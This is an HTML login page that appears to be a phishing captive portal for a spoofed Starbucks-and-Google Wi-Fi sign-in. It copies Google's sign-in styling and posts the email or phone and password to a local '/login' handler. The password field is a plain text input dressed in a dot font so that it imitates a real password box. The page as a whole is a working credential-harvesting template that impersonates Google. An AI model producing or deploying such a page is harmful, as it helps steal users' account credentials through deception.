<html>
<head>
  <title>Connect</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    @font-face {
      font-family: 'Open Sans';
      font-style: normal;
      font-weight: 400;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-regular.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-regular.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: italic;
      font-weight: 400;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-italic.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-italic.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: normal;
      font-weight: 500;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-500.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-500.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: italic;
      font-weight: 500;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-500italic.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-500italic.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: normal;
      font-weight: 700;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-700.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-700.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: italic;
      font-weight: 700;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-700italic.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-700italic.woff') format('woff');
    }
    @font-face {
      font-family: 'Password Dots';
      font-style: normal;
      font-weight: 400;
      src:
        local(''),
        url('/fonts/password-dots.woff2') format('woff2'),
        url('/fonts/password-dots.woff') format('woff');
    }
    * {
      font-family: 'Open Sans', sans-serif;
      margin: 0;
    }
    input[type=text] {
      outline:none;
      border: none;
      box-shadow: 0 0 0 1px lightgray;
      border-radius: 5px;
      transition: border 0.1s;
    }
    input[type=text]:focus {
      box-shadow: 0 0 0 2px #1374e9;
    }
    input[type=text]+label {
      position: absolute;
      top: -9px;
      left: 12px;
      padding: 0 5px;
      font-size: 12px;
      background:white;
      color: gray;
      transition: top 0.1s, font-size 0.1s, background 0.1s, color 0.1s;
    }
    input[type=text]:invalid+label {
      top: 16px;
      font-size: 16px;
      background-color: transparent;
      color: gray;
    }
    input[type=text]:focus+label {
      top: -9px;
      font-size: 12px;
      background:white;
      color: #1374e9;
    }
    input[type=submit] {
      font-weight: 500;
      padding: 10px 25px;
      border: none;
      background-color: #1374e9;
      color: white;
      border-radius: 5px;
    }
    input[type=submit]:hover {
      background-color: #1466ca;
      cursor: pointer;
    }
    input[type=submit]:active {
      background-color: #0f4c97;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div style="width:100%;height:100%;display:flex;flex-direction:column;align-items:center;overflow-y:auto">
    <div style="width:100%;min-height:0;height:calc((100% - 601px) / 2)"></div>
    <div style="display:flex;width:90%;max-width:400px;margin:40px 0;padding:65px 0;flex-direction:column;align-items:center;gap:35px;border:1px solid lightgray;border-radius:10px">
      <div style="display:flex;align-items:center;gap:18px">
        <img src="/img/google.png" style="width:55px;height:55px">
        <img src="/img/heart.png" style="width:9px;height:12px">
        <img src="/img/starbucks.png" style="width:55px;height:55px">
      </div>
      <div style="display:flex;margin:0 15px;flex-direction:column;align-items:center;gap:10px;text-align:center">
        <p style="font-size:20px;font-weight:500">Sign in</p>
        <p style="font-size:14px">with your Google account</p>
      </div>
      <form action="/login" method="post" style="width:80%;margin-top:10px;display:flex;flex-direction:column;align-items:center;gap:15px">
        <div style="width:100%;position:relative">
          <input type="text" id="input_username" name="username" required style="width:100%;height:54px;padding:0 15px;font-size:16px">
          <label for="input_username">Email or phone</label>
        </div>
        <div style="width:100%;position:relative">
          <input type="text" id="input_password" name="password" required style="width:100%;height:54px;padding:0 15px;font-size:16px;font-family:'Password Dots','Open Sans',sans-serif">
          <label for="input_password">Password</label>
        </div>
        <div style="width:100%;margin-top:20px;display:flex;justify-content:flex-end">
          <input type="submit" value="Sign in" style="font-size:15px">
        </div>
      </form>
    </div>
  </div>
</body>
</html>
